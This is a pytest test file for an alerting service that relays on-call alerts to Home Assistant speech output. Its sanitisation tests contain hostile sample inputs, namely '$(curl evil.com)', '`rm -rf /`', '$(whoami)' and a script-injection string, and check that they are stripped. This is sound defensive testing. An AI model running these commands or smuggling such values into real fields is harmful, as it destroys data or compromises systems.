"""Tests for robustness and security: sanitization, safe formatter, dedup, client lifecycle."""

from __future__ import annotations

import time
from unittest.mock import AsyncMock, MagicMock

import pytest

from src.alert_processor import _MAX_DEDUP_CACHE_SIZE, AlertProcessor
from src.config import Settings
from src.ha_client import HAClient
from src.jsm_client import JSMClient
from tests.conftest import make_alert


def _settings(**kwargs) -> Settings:
    defaults = {
        "jsm_cloud_id": "test-cloud-id",
        "jsm_username": "test@example.com",
        "jsm_api_token": "test-token",
        "jsm_my_user_id": "my-user-id",
        "check_oncall_schedule_names": ["Cloud Engineering On-Call Schedule"],
        "always_notify_schedule_names": ["Internal Systems_schedule"],
        "ha_url": "https://ha.example.com",
        "ha_token": "ha-test-token",
    }
    defaults.update(kwargs)
    return Settings(**defaults)


def _processor(settings: Settings, is_on_call: bool = True) -> AlertProcessor:
    jsm = MagicMock(spec=JSMClient)
    jsm.my_user_id = settings.jsm_my_user_id
    jsm.get_schedule_id = AsyncMock(return_value="sched-001")
    jsm.is_on_call = AsyncMock(return_value=is_on_call)
    jsm.invalidate_oncall_cache = MagicMock()

    ha = MagicMock(spec=HAClient)
    ha.media_player = settings.ha_media_player_entity
    ha.play_tts_alert = AsyncMock(return_value=True)
    ha.play_tts_batch = AsyncMock(return_value=True)
    ha.send_persistent_notification = AsyncMock(return_value=True)
    ha.dismiss_notification = AsyncMock(return_value=True)
    ha._set_volume = AsyncMock(return_value=True)

    return AlertProcessor(settings, jsm, ha)


# ── Dedup cache max size ─────────────────────────────────────────────────────


def test_dedup_cache_bounded():
    """Dedup cache must not grow past _MAX_DEDUP_CACHE_SIZE."""
    s = _settings()
    proc = _processor(s)

    # Directly stuff the cache beyond the limit.
    now = time.monotonic()
    for i in range(_MAX_DEDUP_CACHE_SIZE + 100):
        proc._dedup_cache[f"alert-{i}:Create"] = now

    # Process one more alert — this triggers the size check.
    payload = make_alert(alert_id="overflow-alert", action="Create")
    proc._is_duplicate(payload)

    # Cache should have been evicted down.
    assert len(proc._dedup_cache) <= _MAX_DEDUP_CACHE_SIZE


# ── Dismiss result tracking ──────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_dismiss_logs_ha_result():
    """Dismiss action should still mark dismissed=True even if HA call fails."""
    s = _settings()
    proc = _processor(s)
    proc.ha_client.dismiss_notification = AsyncMock(return_value=False)  # HA failed

    payload = make_alert(action="Acknowledge")
    result = await proc.process(payload)

    assert result["dismissed"] is True
    proc.ha_client.dismiss_notification.assert_awaited_once()


# ── Persistent httpx client ──────────────────────────────────────────────────


def test_jsm_client_has_persistent_http():
    """JSMClient should have a persistent httpx.AsyncClient."""
    import httpx

    client = JSMClient(
        api_url="https://api.atlassian.com",
        cloud_id="test",
        username="test@example.com",
        api_token="token",
        my_user_id="user-id",
    )
    assert isinstance(client._http, httpx.AsyncClient)


def test_ha_client_has_persistent_http():
    """HAClient should have a persistent httpx.AsyncClient."""
    import httpx

    client = HAClient(
        ha_url="https://ha.example.com",
        ha_token="token",
        media_player="media_player.test",
        tts_service="tts.test",
        tts_language="en-US",
        tts_voice="TestVoice",
    )
    assert isinstance(client._http, httpx.AsyncClient)


@pytest.mark.asyncio
async def test_jsm_client_aclose():
    """JSMClient.aclose() should close the HTTP client without error."""
    client = JSMClient(
        api_url="https://api.atlassian.com",
        cloud_id="test",
        username="test@example.com",
        api_token="token",
        my_user_id="user-id",
    )
    await client.aclose()
    assert client._http.is_closed


@pytest.mark.asyncio
async def test_ha_client_aclose():
    """HAClient.aclose() should close the HTTP client without error."""
    client = HAClient(
        ha_url="https://ha.example.com",
        ha_token="token",
        media_player="media_player.test",
        tts_service="tts.test",
        tts_language="en-US",
        tts_voice="TestVoice",
    )
    await client.aclose()
    assert client._http.is_closed


# ── TTS repeat race condition fix ────────────────────────────────────────────


@pytest.mark.asyncio
async def test_start_repeat_cancels_existing():
    """Starting a repeat for the same alert should cancel the old one."""
    import asyncio

    s = _settings(
        tts_repeat_interval_seconds=60, tts_repeat_max=5, tts_repeat_priorities="P1"
    )
    proc = _processor(s)

    alert = make_alert(priority="P1").alert

    # Start first repeat.
    proc._start_tts_repeat(alert, "Create", "media_player.test")
    first_task = proc._repeat_tasks.get("alert-001")
    assert first_task is not None

    # Start second repeat for same alert — should cancel the first.
    proc._start_tts_repeat(alert, "Create", "media_player.test")
    second_task = proc._repeat_tasks.get("alert-001")
    assert second_task is not None
    assert second_task is not first_task

    # Let the event loop process the cancellation.
    await asyncio.sleep(0)
    assert first_task.cancelled()


# ── Input sanitization ───────────────────────────────────────────────────────


def test_sanitizer_strips_shell_metacharacters():
    from src.ha_client import _sanitize

    assert _sanitize("hello") == "hello"
    assert _sanitize("$(whoami)") == "whoami"
    assert _sanitize("`rm -rf /`") == "rm -rf /"  # backticks stripped, / kept
    assert _sanitize("foo; bar") == "foo bar"
    assert _sanitize("a|b&c") == "abc"
    assert _sanitize("test<script>alert(1)</script>") == "testscriptalert1/script"


def test_sanitizer_strips_control_characters():
    from src.ha_client import _sanitize

    assert _sanitize("line1\x00line2") == "line1line2"
    assert _sanitize("null\x01byte") == "nullbyte"


def test_sanitizer_preserves_normal_text():
    from src.ha_client import _sanitize

    text = "Priority 1, Critical alert: CPU usage at 95% on prod-server-01!"
    assert _sanitize(text) == text


def test_format_vars_sanitizes_alert_fields():
    """Alert fields with shell metacharacters should be stripped."""
    client = HAClient(
        ha_url="https://ha.example.com",
        ha_token="token",
        media_player="media_player.test",
        tts_service="tts.test",
        tts_language="en-US",
        tts_voice="TestVoice",
    )
    alert = make_alert(
        message="$(curl evil.com)",
        entity="`rm -rf /`",
        description="normal description",
    ).alert
    variables = client._format_vars(alert, "Create")
    assert "$" not in variables["message"]
    assert "`" not in variables["entity"]
    assert "curl evil.com" in variables["message"]


# ── Safe formatter ───────────────────────────────────────────────────────────


def test_safe_formatter_allows_simple_placeholders():
    from src.ha_client import _safe_fmt

    result = _safe_fmt.format("{greeting} {name}!", greeting="Hello", name="World")
    assert result == "Hello World!"


def test_safe_formatter_blocks_attribute_access():
    from src.ha_client import _safe_fmt

    with pytest.raises(ValueError, match="Unsafe format field"):
        _safe_fmt.format("{obj.__class__}", obj="test")


def test_safe_formatter_blocks_index_access():
    from src.ha_client import _safe_fmt

    with pytest.raises(ValueError, match="Unsafe format field"):
        _safe_fmt.format("{obj[0]}", obj=["a", "b"])


# ── Emoji toggle ─────────────────────────────────────────────────────────────


def _make_client(enable_emojis: bool = True) -> HAClient:
    return HAClient(
        ha_url="https://ha.example.com",
        ha_token="token",
        media_player="media_player.test",
        tts_service="tts.test",
        tts_language="en-US",
        tts_voice="TestVoice",
        enable_emojis=enable_emojis,
    )


def test_emoji_enabled_includes_emojis_in_metadata():
    client = _make_client(enable_emojis=True)
    alert = make_alert(priority="P1", message="Server down").alert
    meta = client._build_media_metadata(alert, "Create")
    assert "🔴" in meta["title"]


def test_emoji_disabled_strips_internal_emojis():
    client = _make_client(enable_emojis=False)
    alert = make_alert(priority="P1", message="Server down").alert
    meta = client._build_media_metadata(alert, "Create")
    assert "🔴" not in meta["title"]
    assert "P1:" in meta["title"]
    assert "Server down" in meta["title"]


def test_emoji_disabled_strips_escalation_emoji():
    client = _make_client(enable_emojis=False)
    alert = make_alert(priority="P1", message="Server down").alert
    meta = client._build_media_metadata(alert, "EscalateNext")
    assert "⬆️" not in meta["title"]
    assert "ESCALATED" in meta["title"]


def test_emoji_disabled_strips_emojis_from_incoming_text():
    client = _make_client(enable_emojis=False)
    alert = make_alert(message="🚨 Fire alarm 🔥 triggered").alert
    variables = client._format_vars(alert, "Create")
    assert "🚨" not in variables["message"]
    assert "🔥" not in variables["message"]
    assert "Fire alarm" in variables["message"]
    assert "triggered" in variables["message"]


def test_emoji_enabled_preserves_emojis_in_incoming_text():
    client = _make_client(enable_emojis=True)
    alert = make_alert(message="🚨 Fire alarm 🔥").alert
    variables = client._format_vars(alert, "Create")
    assert "🚨" in variables["message"]
    assert "🔥" in variables["message"]


def test_strip_emojis_function():
    from src.ha_client import _strip_emojis

    assert _strip_emojis("Hello 🌍 World") == "Hello  World"
    assert _strip_emojis("🔴 P1 Alert") == "P1 Alert"
    assert _strip_emojis("No emojis here") == "No emojis here"
    assert _strip_emojis("⬆️ ESCALATED") == "ESCALATED"


# ── Credential alert quiet hours ─────────────────────────────────────────────


@pytest.mark.asyncio
async def test_credential_alert_suppress_tts_skips_play(ha_client):
    """When suppress_tts=True, play_tts_message should NOT be called."""
    ha_client.play_tts_message = AsyncMock(return_value=True)
    ha_client._call_service = AsyncMock(return_value=True)

    await ha_client.send_credential_alert("token expired", suppress_tts=True)

    ha_client.play_tts_message.assert_not_called()
    ha_client._call_service.assert_called_once()  # notification still sent


@pytest.mark.asyncio
async def test_credential_alert_default_plays_tts(ha_client):
    """When suppress_tts is not set, play_tts_message should be called."""
    ha_client.play_tts_message = AsyncMock(return_value=True)
    ha_client._call_service = AsyncMock(return_value=True)

    await ha_client.send_credential_alert("token expired")

    ha_client.play_tts_message.assert_called_once()
    ha_client._call_service.assert_called_once()
